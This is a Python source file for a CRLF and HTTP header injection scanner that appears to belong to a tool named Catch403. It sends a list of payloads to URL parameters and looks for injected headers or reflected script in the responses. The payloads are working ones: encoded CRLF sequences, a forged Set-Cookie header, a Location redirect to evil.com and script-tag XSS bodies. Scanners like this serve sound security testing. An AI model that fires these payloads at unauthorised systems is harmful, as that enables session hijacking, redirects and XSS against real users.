#!/usr/bin/python3
"""
CRLF / HTTP Header Injection Scanner.

Tests URL parameters and headers for CRLF injection vulnerabilities.
A successful injection allows an attacker to:
  - Inject arbitrary HTTP response headers (Set-Cookie, Location)
  - Perform XSS via Content-Type injection
  - Perform response splitting attacks
  - Cache poisoning

Test vectors cover: raw CR/LF, URL-encoded, double-encoded, Unicode variants.

Usage:
  ../.venv/bin/python3 modules/crlf_scanner.py -u "https://target.com/page?next=FUZZ"
  ../.venv/bin/python3 modules/crlf_scanner.py -u https://target.com -p next,url,redirect
"""
import argparse
import json
import re
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run

urllib3.disable_warnings()

TIMEOUT = 15
UA      = {"User-Agent": "Catch403/1.0"}

# Unique marker we inject so we can recognise it in headers
_MARKER = "CRLF-CATCH403"

# ── CRLF payload templates ─────────────────────────────────────────────────
# {m} is replaced with the marker text

_CRLF_TEMPLATES = [
    # Raw CRLF
    "value\r\nX-Injected: {m}",
    "value\nX-Injected: {m}",
    "value\rX-Injected: {m}",
    # URL-encoded
    "value%0d%0aX-Injected:{m}",
    "value%0aX-Injected:{m}",
    "value%0dX-Injected:{m}",
    # Double-encoded
    "value%250d%250aX-Injected:{m}",
    "value%250aX-Injected:{m}",
    # Unicode variants
    "value%E5%98%8AX-Injected:{m}",   # U+560A (looks like \n)
    "value%E5%98%8D%E5%98%8AX-Injected:{m}",
    # Windows-style (double newline = header section end → body injection)
    "value%0d%0a%0d%0a<script>alert(1)</script>",
    "value\r\n\r\n<h1>CRLF-XSS</h1>",
    # Set-Cookie injection
    "value%0d%0aSet-Cookie:{m}=1;Path=/",
    "value%0d%0aLocation:https://evil.com",
    # Content-Type injection for XSS
    "value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('{m}')</script>",
]

# Known indicators that an injection succeeded
_INJECTED_HEADER_RE = re.compile(
    r"x-injected|set-cookie.*crlf|location.*evil\.com|CRLF-CATCH403",
    re.IGNORECASE
)
_XSS_BODY_RE = re.compile(r"<script>alert|<h1>CRLF-XSS|CRLF-XSS", re.IGNORECASE)

# Common redirect/URL params that are often vulnerable to CRLF
COMMON_PARAMS = [
    "next", "redirect", "url", "return", "goto", "dest", "destination",
    "location", "ref", "referrer", "continue", "target", "link", "back",
    "forward", "path", "callback",
]


# ── helpers ────────────────────────────────────────────────────────────────

def _inject(base_url: str, param: str, payload: str) -> str:
    p = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    # Don't re-encode the payload — pass it raw in the query string
    new_qs = "&".join(
        f"{k}={urllib.parse.quote_plus(v)}" if k != param else f"{k}={payload}"
        for k, vals in qs.items() for v in vals
    )
    return p._replace(query=new_qs).geturl()


def _send(url: str, param: str, payload: str,
          headers: dict) -> requests.Response | None:
    try:
        target = _inject(url, param, payload)
        return requests.get(target, headers=headers, timeout=TIMEOUT,
                            verify=False, allow_redirects=False)
    except Exception:
        return None


def _detect_injection(r: requests.Response, payload: str) -> tuple[bool, str]:
    """Return (found, evidence_string)."""
    # Check response headers for injected X-Injected
    for header_name, header_val in r.headers.items():
        if "x-injected" in header_name.lower():
            return True, f"Injected header found: {header_name}: {header_val}"
        if _MARKER in header_val:
            return True, f"Marker found in header '{header_name}': {header_val}"
    # Injected Set-Cookie
    for sc in r.raw.headers.getlist("Set-Cookie"):
        if _MARKER in sc:
            return True, f"Injected Set-Cookie: {sc[:100]}"
    # XSS via body split
    if _XSS_BODY_RE.search(r.text):
        return True, f"XSS content in body (response split): {r.text[:100]}"
    # Location redirect injection
    loc = r.headers.get("Location", "")
    if "evil.com" in loc:
        return True, f"Injected Location redirect: {loc}"
    return False, ""


# ── scan ──────────────────────────────────────────────────────────────────

def scan_param(url: str, param: str, *,
               headers: dict | None = None) -> list[dict]:
    hdrs = {**UA, **(headers or {})}
    findings: list[dict] = []

    for tmpl in _CRLF_TEMPLATES:
        payload = tmpl.replace("{m}", _MARKER)
        r = _send(url, param, payload, hdrs)
        if r is None:
            continue
        found, evidence = _detect_injection(r, payload)
        if found:
            findings.append({
                "name": "CRLF / Header Injection",
                "severity": "high",
                "detail": (
                    f"CR/LF injection in parameter '{param}' allows arbitrary "
                    f"HTTP header injection.\n{evidence}\nPayload: {payload!r}"
                ),
                "url": url,
                "param": param,
                "payload": payload,
                "evidence": evidence,
                "http_request": f"GET {_inject(url, param, payload)} HTTP/1.1\n",
                "curl": f'curl -sk "{_inject(url, param, payload)}" -D -',
            })
            break  # one confirmed CRLF per param is enough

    return findings


def scan(url: str, *,
         params: list[str] | None = None,
         headers: dict | None = None) -> list[dict]:
    parsed = urllib.parse.urlparse(url)
    qs_params = list(urllib.parse.parse_qs(parsed.query).keys())
    target_params = params or qs_params or COMMON_PARAMS

    all_findings: list[dict] = []
    for param in target_params:
        all_findings.extend(scan_param(url, param, headers=headers))

    if not all_findings:
        all_findings.append({
            "name": "No CRLF Injection Detected",
            "severity": "info",
            "detail": f"Tested {len(target_params)} parameter(s) with {len(_CRLF_TEMPLATES)} payloads",
        })
    return all_findings


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 CRLF / Header Injection Scanner")
    parser.add_argument("-u", dest="url", required=True)
    parser.add_argument("-p", dest="params", default="",
                        help="Comma-separated param names (default: auto-detect + common list)")
    parser.add_argument("--header", dest="headers", action="append", default=[],
                        metavar="NAME:VALUE")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    custom_headers: dict = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    params = [p.strip() for p in args.params.split(",") if p.strip()] or None

    _p = urllib.parse.urlparse(args.url)
    print(f"{run} CRLF scan: {bold}{_p.netloc}{_p.path}{end}")

    results = scan(args.url, params=params, headers=custom_headers)

    for f in results:
        sev = f.get("severity", "info")
        icon = (f"{bold}[HIGH]{end}" if sev == "high"
                else bad if sev == "critical"
                else info)
        print(f"\n{icon} {bold}{f['name']}{end}")
        print(f"      {f.get('detail', '')[:160]}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")


if __name__ == "__main__":
    main()
